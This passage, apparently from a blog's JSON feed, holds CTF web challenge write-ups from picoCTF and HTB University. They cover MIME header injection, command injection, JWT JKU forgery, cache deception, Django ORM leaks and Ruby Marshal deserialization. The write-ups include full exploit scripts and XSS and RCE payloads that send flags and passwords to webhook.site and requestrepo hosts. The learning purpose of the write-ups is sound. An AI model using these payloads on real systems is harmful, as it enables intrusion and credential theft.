print(res.text) a = res.text.strip(\u0026#39;\u0026#34;\u0026#39;) # Remove surrounding quotes res = s.get(url+\u0026#39;/api/email/\u0026#39;+a,json = data,headers=headers) boundary = re.findall(r\u0026#34;===============(\\d+)==\u0026#34;,res.json().get(\u0026#39;data\u0026#39;))[0] return int(boundary) import randCracker # https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py def error(text): print(f\u0026#34;[\\x1b[41mERROR\\x1b[0m] {text}\u0026#34;) sys.exit() def info(text): print(f\u0026#34;[\\x1b[32;1m+\\x1b[0m] {text}\u0026#34;) ut = randCracker.Untwister() for _ in range(800): b = bin(get_boundary(s))[2:].zfill(63) half1, half2 = b[:31], b[31:] half1 = half1 + \u0026#39;?\u0026#39; ut.submit(half2) ut.submit(half1) r2 = ut.get_random() # Let\u0026#39;s send one more email to ourself and see if our prediction\u0026#39;s correct. info(\u0026#34;State solved!\u0026#34;) if r2.getrandbits(63) == get_boundary(s) else error(\u0026#34;Boundary prediction failed.\u0026#34;) _ = r2.getrandbits(63) # skip over the email we send print(\u0026#34;CURRENT MUST BE \u0026#34;,_) # Admin\u0026#39;s boundary string! converted_num = str(int(r2.getrandbits(63))) # Convert to int and back to string smileBOundary = converted_num print(f\u0026#34;THIS IS SMILE SIGN BOUNDARY : {smileBOundary}\u0026#34;) admin_boundary = \u0026#39;%019d\u0026#39; % r2.getrandbits(63) print(f\u0026#34;THIS MUST BE RIGHT : {admin_boundary}\u0026#34;) print(f\u0026#34;FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}\u0026#34;) print(f\u0026#34;FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}\u0026#34;) FINAL PROBLEM # Now we simply use the predicted boundary and get flag right ? What happening to our boundary ? It adds .0 after ? Look at the make_boundary to understand why def _make_boundary(cls ,text=None): # Craft a random boundary. If text is given, ensure that the chosen # boundary doesn\u0026#39;t appear in the text. token = random.randrange(sys.maxsize) boundary = (\u0026#39;=\u0026#39; * 15) + (_fmt % token) + \u0026#39;==\u0026#39; if text is None: return boundary b = boundary counter = 0 while True: cre = cls._compile_re(\u0026#39;^--\u0026#39; + re.escape(b) + \u0026#39;(--)?$\u0026#39;, re.MULTILINE) if not cre.search(text): break b = boundary + \u0026#39;.\u0026#39; + str(counter) counter += 1 return b ```python cre = cls._compile_re(\u0026#39;^--\u0026#39; + re.escape(b) + \u0026#39;(--)?$\u0026#39;, re.MULTILINE) This regrex just check the \u0026lsquo;\u0026ndash;\u0026rsquo; start at the beginning, a space can bypass ? And the parser will still understand\u0026hellip;(ned audit too..) HERE WE GET ITTTTTT !!!!! FINAL SCRIPT # import requests import sys import re import base64 s = requests.Session() url = \u0026#34;http://localhost:8001\u0026#34; data = { \u0026#34;username\u0026#34;:\u0026#34;user@ses\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;50d93cda66e45ffc3c57623a14af2cc7\u0026#34; } res= requests.post(url+\u0026#39;/api/login\u0026#39;,json=data) clean_hex = res.text.strip(\u0026#39;\u0026#34;\u0026#39;) # Remove surrounding quotes headers = { \u0026#39;Token\u0026#39;: clean_hex } print(res.text) def encode_base64(text): encoded_bytes = base64.b64encode(text.encode(\u0026#39;utf-8\u0026#39;)) return f\u0026#39;=?utf-8?B?{encoded_bytes.decode()}?=\u0026#39; boundary = \u0026#34;===============adminone==\u0026#34; def get_boundary(s) -\u0026gt; int: data = { \u0026#34;to\u0026#34;: \u0026#34;user@ses\u0026#34;, \u0026#34;subject\u0026#34;: \u0026#39;hi\u0026#39;, \u0026#34;body\u0026#34;: \u0026#34;faewfef\u0026#34; } res = s.post(url+\u0026#39;/api/send\u0026#39;,json = data,headers=headers) print(res.text) a = res.text.strip(\u0026#39;\u0026#34;\u0026#39;) # Remove surrounding quotes res = s.get(url+\u0026#39;/api/email/\u0026#39;+a,json = data,headers=headers) boundary = re.findall(r\u0026#34;===============(\\d+)==\u0026#34;,res.json().get(\u0026#39;data\u0026#39;))[0] return int(boundary) import randCracker # https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py def error(text): print(f\u0026#34;[\\x1b[41mERROR\\x1b[0m] {text}\u0026#34;) sys.exit() def info(text): print(f\u0026#34;[\\x1b[32;1m+\\x1b[0m] {text}\u0026#34;) ut = randCracker.Untwister() for _ in range(800): b = bin(get_boundary(s))[2:].zfill(63) half1, half2 = b[:31], b[31:] half1 = half1 + \u0026#39;?\u0026#39; ut.submit(half2) ut.submit(half1) r2 = ut.get_random() # Let\u0026#39;s send one more email to ourself and see if our prediction\u0026#39;s correct. info(\u0026#34;State solved!\u0026#34;) if r2.getrandbits(63) == get_boundary(s) else error(\u0026#34;Boundary prediction failed.\u0026#34;) _ = r2.getrandbits(63) # skip over the email we send print(\u0026#34;CURRENT MUST BE \u0026#34;,_) # Admin\u0026#39;s boundary string! admin_boundary = \u0026#39;%019d\u0026#39; % r2.getrandbits(63) print(f\u0026#34;THIS MUST BE RIGHT : {admin_boundary}\u0026#34;) print(f\u0026#34;THIS IS OF SMILE KK: {r2.getrandbits(63)}\u0026#34;) print(f\u0026#34;FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}\u0026#34;) script = base64.b64encode(\u0026#34;fetch(\u0026#39;https://vqbe0frw.requestrepo.com/?q=\u0026#39;+localStorage.getItem(\u0026#39;flag\u0026#39;))\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;).replace(\u0026#39;=\u0026#39;,\u0026#39;+AD0-\u0026#39;) print(script) payload = f\u0026#34;\u0026#34;\u0026#34;hi --==============={admin_boundary}== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-eval(atob(\u0026#39;{script}\u0026#39;))+ADs-+ACA-/+AD4- --==============={admin_boundary}== \u0026#34;\u0026#34;\u0026#34; final_payload = f\u0026#39;hi=?ISO-8859-1?B?{base64.b64encode(payload.encode()).decode()}?=\\nFrom : admin@ses\u0026#39; data = { \u0026#39;to\u0026#39;:\u0026#34;admin@ses\u0026#34;, \u0026#34;subject\u0026#34;: final_payload, \u0026#34;body\u0026#34;:\u0026#34;HI\u0026#34; } res= requests.post(url+\u0026#39;/api/send\u0026#39;,json=data,headers=headers) res= requests.post(url+\u0026#39;/api/admin_bot\u0026#39;,json=data,headers=headers) res= requests.post(url+\u0026#39;/api/admin_bot\u0026#39;,json=data,headers=headers) print(res.text) FINALLY # This is superhard challenges and i learn a lot from this. As well as some skill to test the app . This is too valuable\u0026hellip;\nSome questions ? # Why we need a JINJA spots for executing this vulnerabiliites ? And why injecting \u0026lsquo;\\n\u0026rsquo; in headers work but not \u0026lsquo;\\n\\n\u0026rsquo; ? Read the code lead us to result that there\u0026rsquo;s a simple check lines = string.splitlines() if lines: formatter.feed(\u0026#39;\u0026#39;, lines[0], charset) else: formatter.feed(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, charset) So we cannot separate our payload outside the HEADER section to pollute the BODY section . Furthermore, there\u0026rsquo;s something still in blackbox and I need time to figure it out. Just keep having fun. ","date":"25 March 2025","externalUrl":null,"permalink":"/posts/pico/","section":"Posts","summary":"Secure Email Service # This is the hardest web challenge from picoCTF. Knowledge : MIME email document structure, Signed Email, Header Injection, Breaking weak cryptography.\nFind the sink : # So the challenge gives us a bot with flag in localStorage and does some stuffs. from os import environ from playwright.async_api import async_playwright, expect import asyncio import re flag = environ.get(\u0026#39;FLAG\u0026#39;, \u0026#39;picoCTF{flag}\u0026#39;) password = environ.get(\u0026#39;PASSWORD\u0026#39;, \u0026#39;admin@ses\u0026#39;) async def bot(): async with asyncio.","title":"PicoCTF 2025","type":"posts"},{"content":" Write ups HTB UNIVERSITY # Web armaxis # Logic is only thing\nOverview : # We are given a page and a email host to receive OTP. Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.\nrouter.post(\u0026#34;/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; // Added \u0026#39;email\u0026#39; parameter if (!token || !newPassword || !email) return res.status(400).send(\u0026#34;Token, email, and new password are required.\u0026#34;); try { const reset = await getPasswordReset(token); if (!reset) return res.status(400).send(\u0026#34;Invalid or expired token.\u0026#34;); const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); await updateUserPassword(user.id, newPassword); await deletePasswordReset(token); res.send(\u0026#34;Password reset successful.\u0026#34;); } catch (err) { console.error(\u0026#34;Error resetting password:\u0026#34;, err); res.status(500).send(\u0026#34;Error resetting password.\u0026#34;); } }); It doesnt check the email after all :v so we just get token sent to our email and submit with email of admin. Then we get access !!! Admin # As an admin, we have more functions which is creating weapon and use MARKDOWN to note it. Here is logic:\nfunction parseMarkdown(content) { if (!content) return \u0026#39;\u0026#39;; return md.render( content.replace(/\\!\\[.*?\\]\\((.*?)\\)/g, (match, url) =\u0026gt; { try { const fileContent = execSync(`curl -s ${url}`); const base64Content = Buffer.from(fileContent).toString(\u0026#39;base64\u0026#39;); console.log(\u0026#34;IMAGE\u0026#34;) return `\u0026lt;img src=\u0026#34;data:image/*;base64,${base64Content}\u0026#34; alt=\u0026#34;Embedded Image\u0026#34;\u0026gt;`; } catch (err) { console.error(`Error fetching image from URL ${url}:`, err.message); console.log(\u0026#34;P TAG\u0026#34;) return `\u0026lt;p\u0026gt;Error loading image: ${url}\u0026lt;/p\u0026gt;`; } }) ); } It puts our url into a execSync ? So vulnearble to command injection.And that regrex simply cannot stop us ! We can put something like : $url = \u0026#34;; cat\u0026#39;/flag.txt\u0026#39;\u0026#34; And our result will be base64 encoded , we just easily decode and get the result; And get the result Decode and get flag : Web Breaking Bank # HTB challenge Knowledge : JKU vulnerabilities Goal # To get the flag , we need to login as finacial email and then dumps all money to get the flag :v import { getBalancesForUser } from \u0026#39;../services/coinService.js\u0026#39;; import fs from \u0026#39;fs/promises\u0026#39;; const FINANCIAL_CONTROLLER_EMAIL = \u0026#34;financial-controller@frontier-board.htb\u0026#34;; /** * Checks if the financial controller\u0026#39;s CLCR wallet is drained * If drained, returns the flag. */ export const checkFinancialControllerDrained = async () =\u0026gt; { const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL); const clcrBalance = balances.find((coin) =\u0026gt; coin.symbol === \u0026#39;CLCR\u0026#39;); if (!clcrBalance || clcrBalance.availableBalance \u0026lt;= 0) { const flag = (await fs.readFile(\u0026#39;/flag.txt\u0026#39;, \u0026#39;utf-8\u0026#39;)).trim(); return { drained: true, flag }; } return { drained: false }; }; OVERVIEW # This challenge use JWT to check the email with an unexploitable secret key. But this uses RSA- 256 algorithms so we have this page: export const createToken = async (payload) =\u0026gt; { const privateKey = await getPrivateKey(); return jwt.sign(payload, privateKey, { algorithm: \u0026#39;RS256\u0026#39;, header: { kid: KEY_ID, jku: JWKS_URI, }, }); }; It create jwt with a JKU !! JKU is a header to specify the position for jwt to extract the PUBLIC KEY to sign the data. But it is polluted with open redirect !!It blocks the open redirect. if (!jku.startsWith(\u0026#39;http://127.0.0.1:1337/\u0026#39;)) { throw new Error(\u0026#39;Invalid token: jku claim does not start with http://127.0.0.1:1337/\u0026#39;); } if (!kid) { throw new Error(\u0026#39;Invalid token: Missing header kid\u0026#39;); } if (kid !== KEY_ID) { return new Error(\u0026#39;Invalid token: kid does not match the expected key ID\u0026#39;); } But there is a vulnerable route can help us.\nfastify.get(\u0026#39;/redirect\u0026#39;, async (req, reply) =\u0026gt; { const { url, ref } = req.query; if (!url || !ref) { return reply.status(400).send({ error: \u0026#39;Missing URL or ref parameter\u0026#39; }); } // TODO: Should we restrict the URLs we redirect users to? try { await trackClick(ref, decodeURIComponent(url)); reply.header(\u0026#39;Location\u0026#39;, decodeURIComponent(url)).status(302).send(); } catch (error) { console.error(\u0026#39;[Analytics] Error during redirect:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to track analytics data.\u0026#39; }); } }); It doesnt check the redirect so we can abuse this and perform an JKU redirect to our own PUBLIC key.\nLet\u0026rsquo;s do it # First create my own jwks.json. You can just use some tools to create it.\n{ \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;c709d578-666c-4683-84fb-f505652e6420\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;rGUZNQp2-rW1m4nlKqcFeAeWekWYreyqRsVb3keRnOPqZttlvpE5_gkQnmYMo0n0FHmgfeHHcFXNqXLpy2ZvfOr5EGRtk4sJXeLgTdHYukH3VrdGpIOyyTsOEFsCcHGamNGHUqdKRcEkVKdRzHkhjsEOMW6_APgS0ukqiKHBuiaspIQUiIS7xsna8x6Zh8R2COATOsSH2ae6PXBTaPzoaf13SdZvAvAfBBC7xJk6KQwdV99pazvJnh6c5GbIpVPle694cy8oDQ8gDtaOIOy4TTbT7aHB0eiSvpSGfEAqIXj8kWyiFNZHeCWTYm0_ly7Pn2JhNYkp25bv8nwXICoKpQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34; } ] } Then you use your own public key and private key to sign a new data (remember to change the kid==orignal kid) Here is the full script exploit :\nimport requests url = \u0026#39;http://localhost:1337\u0026#39; res = requests.post(url+\u0026#39;/api/auth/register\u0026#39;,json={\u0026#34;email\u0026#34;:\u0026#34;123@gmail.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;}) token=\u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImM3MDlkNTc4LTY2NmMtNDY4My04NGZiLWY1MDU2NTJlNjQyMCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3JlZj1oaWhpJnVybD1odHRwOi8vYW5ub3llZC1kZXNpZ24uc3VyZ2Uuc2gvandrcy5qc29uIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiIsImlhdCI6MTczNDUxODk3Mn0.V83p1kybpP1QLVG0oZvaXyygy-EABntI2c-c3s1-y6dTSZsMXOVZYh9CcGyi8hEnv4dlqxhsm8_CBc7_KsxYbzIauzOFAzfiEHQ6oDo889mDjbeBb-JB1zNOohrOFih27BUKhXtOakn89LnBoR6tIlhISHbjvJpCOmN8Uxb2v56WatmTQBut6GkeAQN9_u0hWeYsIxHPIhPfvg_S1BbXtROXiPy-0aCI67pzmr8sgB5GZRyF5lKpq5w9iQ6BfQC8fosNfsI_g60Nh-xtUyiDIOFyukbLggesTOVzgJQ5VPy853VqDkRj39rxeIH5nbztHwdQiw5RyFvQQCOkWCkqiA\u0026#34; headers ={ \u0026#34;Authorization\u0026#34;:\u0026#34;Bearer \u0026#34;+ token } coins = requests.get(url+\u0026#39;/api/crypto/balance\u0026#39;,headers=headers).json()[0][\u0026#39;availableBalance\u0026#39;] print(coins) def generate_all_4_digit_combinations(): combinations = [] for i in range(10000): combinations.append(str(i).zfill(4)) return combinations // Easy bypass OTP here all_combinations = generate_all_4_digit_combinations() dataTransaction = { \u0026#34;to\u0026#34;:\u0026#34;123@gmail.com\u0026#34;, \u0026#34;amount\u0026#34;:coins, \u0026#34;coin\u0026#34;:\u0026#39;CLCR\u0026#39;, \u0026#34;otp\u0026#34;:\u0026#39;\u0026#39;.join(all_combinations) } res = requests.post(url+\u0026#39;/api/crypto/transaction\u0026#39;,json=dataTransaction,headers=headers) res = requests.get(url+\u0026#39;/api/dashboard\u0026#39;,headers=headers) print(res.text) FLAGGG Conclusion # The source is too long , and consumes me so much time to find out :vvv\nContract Front End Write ups # HTB challenge. Knowlegde :\nWeb cache deception ORM Leaks Xss with missing charset Insecure Deserialization in Marshal A bunch of researches is pushed into this CTF :v Overview : # We will have a flag stored at \u0026lsquo;/\u0026rsquo; and we need to find some ways to trigger a execution We are given a big source code but we focus on somethings : There are 3 privileges: guest, contract_manager, admin. We will try to gain the admin privilege first. So let\u0026rsquo;s go. Source code : # Focus on how to get contract_manager first :v\ndef get_contract_manager_password(): try: contract_manager = User.objects.get(username=\u0026#34;contract_manager\u0026#34;) return contract_manager.password except User.DoesNotExist: raise ValueError(\u0026#34;Contract Manager user does not exist in the database\u0026#34;) def startChromiumBot(url): print(url, file=sys.stdout) chrome_options = Options() chrome_options.binary_location = \u0026#34;/usr/bin/chromium-browser\u0026#34; chrome_options.add_argument(\u0026#34;--headless\u0026#34;) chrome_options.add_argument(\u0026#34;--no-sandbox\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-dev-shm-usage\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-gpu\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-software-rasterizer\u0026#34;) chrome_service = Service(\u0026#34;/usr/bin/chromedriver\u0026#34;) driver = webdriver.Chrome(service=chrome_service, options=chrome_options) try: driver.get(\u0026#39;http://127.0.0.1:1337/login\u0026#39;) WebDriverWait(driver, 15).until( EC.presence_of_element_located((By.ID, \u0026#34;loginBtn\u0026#34;)) ) username = \u0026#34;contract_manager\u0026#34; password = get_contract_manager_password() input1 = driver.find_element(By.XPATH, \u0026#39;/html/body/code/section/div/div/div/form/div[1]/input\u0026#39;) input2 = driver.find_element(By.XPATH, \u0026#39;/html/body/code/section/div/div/div/form/div[2]/input\u0026#39;) # Can i abuse this to get password input1.send_keys(username) input2.send_keys(password) submit_button = driver.find_element(By.ID, \u0026#34;loginBtn\u0026#34;) driver.execute_script(\u0026#34;arguments[0].click();\u0026#34;, submit_button) driver.get(url) time.sleep(30) finally: driver.quit() -\u0026gt; This will create a contract_manager account and use it as a bot and then visit our website. We cannot really stole the cookie due to http only but if we can xss , we can call any command of a contract_manager which we wil talk later after finding xss.\nFinding XSS # So this is the first time I try xss in ruby so i search something and it seems something like : \u0026lt;%= @a.html_safe %\u0026gt; This will be vulnerable to xss if we control the @a so I try to find that gadget and there is something here: # app/helpers/application_helper.rb module ApplicationHelper def render_markdown(text) return \u0026#39;\u0026#39; if text.nil? # Return an empty string if text is nil # Configure Redcarpet to render Markdown with links and images enabled renderer = Redcarpet::Render::HTML.new(filter_html: true) markdown = Redcarpet::Markdown.new(renderer, { no_intra_emphasis: true, autolink: true, tables: true, fenced_code_blocks: true, disable_indented_code_blocks: true, strikethrough: true, superscript: true }) # Render Markdown to HTML markdown.render(text).html_safe end end Yeh , so we find a markdown xss vulnerabilities here. It is rendered in /settings template. Importantly, It will filter all HTML tag and just left the images and link. So now add some javascript link [abc](javascript:alert\u0026#39;1\u0026#39;) Well we have xss but it seems a self xss and we cannot call anything like onerror automatically. But then you can find something interesting in the source code at # lib/remove_charset_middleware.rb class RemoveCharsetMiddleware def initialize(app) @app = app end def call(env) status, headers, response = @app.call(env) headers[\u0026#34;Content-Type\u0026#34;] = headers[\u0026#34;Content-Type\u0026#34;].sub(/; charset=.*$/, \u0026#39;\u0026#39;) if headers[\u0026#34;Content-Type\u0026#34;] [status, headers, response] end end You can see , there is no charset specified !! Damnn, xss with missing charset comes into the play. Just try some \\x1b$B and \\x1b(B now bro. Here we get ISO-2022-JS ~~ !!. So this time to configure a payload to call an onerror. After a long time, it will be : bio: ![\\x1B$@](abc)+\\x1B(B+![abc](onerror=alert//) \u0026mdash;\u0026raquo; Now we have XSS !!!!\nHow to this XSS trigger the contract_manager # Another problem is how this xss can be visited by contract_manager ? It is depended on our session and render each own settings right ? So how can it is possible . Now we come to a new technique called Web Cache Depception , you can see this video for more understand. server { listen 1337; server_name _; # Proxy server forward to localhost:3000 and cache possible location ~ \\.(css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json)$ { proxy_cache my_cache; proxy_cache_key \u0026#34;$uri$is_args$args\u0026#34;; proxy_cache_valid 200 5m; proxy_cache_valid 404 1m; proxy_pass http://127.0.0.1:3000; proxy_set_header Host $http_host; # Pass original host and port proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; add_header X-Cache-Status $upstream_cache_status; } location / { proxy_pass http://127.0.0.1:3000; proxy_set_header Host $http_host; # Pass original host and port proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; add_header X-Cache-Status $upstream_cache_status; } } This is configure to cache our data through a proxy server before forwarding to server. Let me simply explain how web cache works.\nFirst it will check the filename fetched extension before caching it, if the cache isn\u0026rsquo;t storing any thing , forward the requests to server and get the response then store response cache. Any time after this , ANOTHER calls to the same resources, it will check from cache first and receive data from cache. But we call poison the cache with OUR XSS PAYLOAD !!!. We can find some bypass based on difference of parsing delemiter between nginx and and ruby. (delimiter in ruby is \u0026ldquo;.\u0026rdquo;) So if we call a request like \u0026ldquo;/settings.ico\u0026rdquo; this will matches with \u0026ldquo;/settings\u0026rdquo; in ruby !! But it will be cached in proxy cache server !! We can test it with simple call a GET requests to /settings.ico\nBefore caching : Successfully caching : Now everyone gets into settings.ico will be poisonous with our xss !! And as well as the CONTRACT_MANAGER Gain access as a contract_manager partly # We had XSS but we cannot stole the cookies like I said before. But we can also call every routes of a contract_manager !! So let\u0026rsquo;s login as a contract_manager with our Docker for a faster investigate. AS a contact_manager, we have only new Features is FILTERING http://localhost:1337/contracts/manage?title__contains=\u0026amp;status=\u0026amp;start_date=\u0026amp;end_date= So let\u0026rsquo;s read the source to find some vulnerabilites\nclass FilteredContractsView(APIView): permission_classes = [IsAuthenticated, IsContractManagerOrAdmin] def post(self, request, format=None): try: if request.data.get(\u0026#34;all\u0026#34;) == True: contracts = Contract.objects.all() else: filtered_data = {key: value for key, value in request.data.items() if key != \u0026#34;all\u0026#34;} contracts = Contract.objects.filter(**filtered_data) serializer = ContractSerializer(contracts, many=True) except Exception as e: return Response({\u0026#34;error\u0026#34;: str(e)}, status=status.HTTP_400_BAD_REQUEST) return Response(serializer.data, status=status.HTTP_200_OK) This app handles SQL with a django ORM. When apply a filter function the syntax for example : products = Product.objects.filter(name=\u0026#39;Laptop\u0026#39;) But there is something leaked with\nfiltered_data = {key: value for key, value in request.data.items() if key != \u0026#34;all\u0026#34;} contracts = Contract.objects.filter(**filtered_data) We can handle our choice to select !!! You can read more here to better understand https://www.elttam.com/blog/plormbing-your-django-orm/\nNow we need to find what we can leak here by reading it\u0026rsquo;s relationship establishment. owner = models.ForeignKey( settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name=\u0026#39;contracts\u0026#39;, help_text=\u0026#34;User who owns the contract\u0026#34; ) In the Contract model , it has a field owner who owns the contracts !! And we can leak the username password with owner__password__startswith= \u0026ldquo;randomCharHere\u0026rdquo; like boolean search. Here is exploit :\nchars = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; adminPassword =\u0026#34;\u0026#34; webhook = \u0026#34;https://webhook.site/307dd0c2-4733-4e45-954a-009ff8242f3a?a=\u0026#34; function leak(adminPassword) { if(adminPassword.length == 32) { fetch(webhook+adminPassword) } for (let char of chars) { fetch(url+adminPassword+char) .then(data=\u0026gt;data.text()) .then((data)=\u0026gt;{ if(!data.includes(\u0026#34;No contracts found based on the current filter.\u0026#34;)){ adminPassword+=char console.log(adminPassword) leak(adminPassword) } }) } } leak(adminPassword) Now we test this script on Dev tools And receive admin password at webhook : Now combine this with our xss before to create a malicous script src !! Then report it and receive admin pasword !! bio : ![\\x1B$@](abc)+\\x1B(B+![abc](onerror=s=document.createElement(\u0026#39;script\u0026#39;);s.src=\u0026#39;http://garrulous-protest.surge.sh/payload.js\u0026#39;;document.body.appendChild(s);//) We successfully leak the admin password so let\u0026rsquo;s login in ADMIN PRIVILEGE # As admin we have the new feature is CONTRACT TEMPLATES.\n# Contract template controllers def create user_data = current_user unless user_data \u0026amp;\u0026amp; user_data[\u0026#39;id\u0026#39;] flash[:alert] = \u0026#34;User must be logged in to create a template.\u0026#34; redirect_to login_path and return end serialized_content = Marshal.dump(params[:content]) response = HTTP.auth(\u0026#34;Token #{session[:token]}\u0026#34;).post(\u0026#34;http://localhost:8080/api/contract_templates/\u0026#34;, json: { data: serialized_content, user_id: user_data[\u0026#39;id\u0026#39;] }.merge(params.to_unsafe_h)) if response.status.success? flash[:notice] = \u0026#34;Template created successfully.\u0026#34; redirect_to contract_templates_path else flash.now[:alert] = \u0026#34;Failed to create template.\u0026#34; render :new end end def show response = HTTP.auth(\u0026#34;Token #{session[:token]}\u0026#34;).get(\u0026#34;http://localhost:8080/api/contract_templates/#{params[:id]}/\u0026#34;) if response.status.success? @template = response.parse content = Marshal.load(@template[\u0026#39;data\u0026#39;]) if @template[\u0026#39;data\u0026#39;] @template[\u0026#39;id\u0026#39;] ||= params[:id] @template[\u0026#39;name\u0026#39;] ||= \u0026#39;Unnamed Template\u0026#39; @template[\u0026#39;description\u0026#39;] ||= \u0026#39;No description provided.\u0026#39; @template[\u0026#39;data\u0026#39;] = content @template[\u0026#39;created_at\u0026#39;] ||= Time.current.to_s else redirect_to contract_templates_path, alert: \u0026#34;Template not found.\u0026#34; end endk When creating a content , it will serialize our data but it seems can be changed with our params cause using merge function?? Is the ruby is vulnerable to Insecure Serialization ? Well doing some reasearch, and the answer is yesss !!! So here is the key to execute code to read file flag. The hard things # Well so the main idea of Insecure Deserialization is find some gadget to call require to some sink function. This is really hard to find it in a CTF challenge, but it is lucky that there are many researcher find this for us. We can use this right now and I will spend sometime to research it latter . :v And here is the POC for that . https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb Apply this we get the payload : #!/usr/bin/python3 import requests from bs4 import BeautifulSoup username = \u0026#34;admin\u0026#34; password = ADMIN_PASSWORD base_url = \u0026#34;http://127.0.0.1:1337\u0026#34; session = requests.Session() def getAuthenToken(html): soup = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) return soup.find(\u0026#34;input\u0026#34;, {\u0026#34;name\u0026#34;: \u0026#34;authenticity_token\u0026#34;})[\u0026#34;value\u0026#34;] login_page = session.get(f\u0026#34;{base_url}/login\u0026#34;) login_page.raise_for_status() authenticity_token = getAuthenToken(login_page.text) login_payload = { \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password, \u0026#34;authenticity_token\u0026#34;: authenticity_token } ## LOGIN AS ADMIN response = session.post(f\u0026#34;{base_url}/login\u0026#34;, data=login_payload) response.raise_for_status() ## GET RCE content_data = \u0026#34;04085b07631547656d3a3a5370656346657463686572553a1147656d3a3a56657273696f6e5b066f3a1e47656d3a3a526571756573745365743a3a4c6f636b66696c650a3a09407365746f3a1447656d3a3a52657175657374536574063a1540736f727465645f72657175657374735b076f3a2547656d3a3a5265736f6c7665723a3a5370656353706563696669636174696f6e063a0a40737065636f3a2447656d3a3a5265736f6c7665723a3a47697453706563696669636174696f6e073a0c40736f75726 3656f3a1547656d3a3a536f757263653a3a4769740a3a09406769744922087a6970063a0645543a0f407265666572656e63654922102f6574632f706173737764063b10543a0e40726f6f745f6469724922092f746d70063b10543a10407265706f7369746f7279492208616e79063b10543a0a406e616d65492208616e79063b10543b0b6f3a2147656d3a3a5265736f6c7665723a3a53706563696669636174696f6e073b14492208616e79063b10543a1240646570656e64656e636965735b006f3b0a063b0b6f3b0c073b0d6f3b0e0a3b0f4922087a6970063b10543b114922652d546d54543d222428776765742068747470733a2f2f776562686f6f6b2e736974652f33303764643063322d343733332d346534352d393534612d3030396666383234326633613f613d60636174202f666c61672e747874602922612e7a6970063b10543b124922092f746d70063b10543b13492208616e79063b10543b14492208616e79063b10543b0b6f3b15073b14492208616e79063b10543b165b003b165b003a134067656d5f646570735f66696c6549220a2f726f6f74063b10543a124067656d5f646570735f6469724922062f063b10543a0f40706c6174666f726d735b00\u0026#34; byte_data = bytes.fromhex(content_data) contracts_page = session.get(f\u0026#34;{base_url}/contract_templates/new\u0026#34;) contracts_page.raise_for_status() authenticity_token = getAuthenToken(contracts_page.text) contracts_payload = { \u0026#34;authenticity_token\u0026#34;: authenticity_token, \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;commit\u0026#34;: \u0026#34;Create Template\u0026#34;, \u0026#34;data\u0026#34;:byte_data } response = session.post(f\u0026#34;{base_url}/contract_templates\u0026#34;, data=contracts_payload) And the flag !! Conclusion # This is a big chain of vulnerabilities and modern attacks skills. I cannot solve this by myself but the write ups helps me alot. I still need to read about the research of ORM leaks, Marshal latter when I have free time :Vvv Web - Intergalactic Bounty # Hard challenge from HTB University Knowledge: Email disparency, Prototype pollution, Needle\nOverview # Firstly, we have an login page where we must register with an account and our given email is test@email.htb Here is the logic for register. It seems just accept the domain interstellar.htb. const registerAPI = async (req, res) =\u0026gt; { const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; const emailDomain = emailAddresses.parseOneAddress(email)?.domain; if (!emailDomain || emailDomain !== \u0026#39;interstellar.htb\u0026#39;) { return res.status(200).json({ message: \u0026#39;Registration is not allowed for this email domain\u0026#39; }); } try { await User.createUser(email, password, role); return res.json({ message: \u0026#34;User registered. Verification email sent.\u0026#34;, status: 201 }); } catch (err) { return res.status(500).json({ message: err.message, status: 500 }); } }; Specially it uses email-address library to parse the email . const emailAddresses = require(\u0026#39;email-addresses\u0026#39;); We can read this from the manual page of email-address It supports the RFC 5322 and gives us an interesting email format: \u0026ldquo;BOB 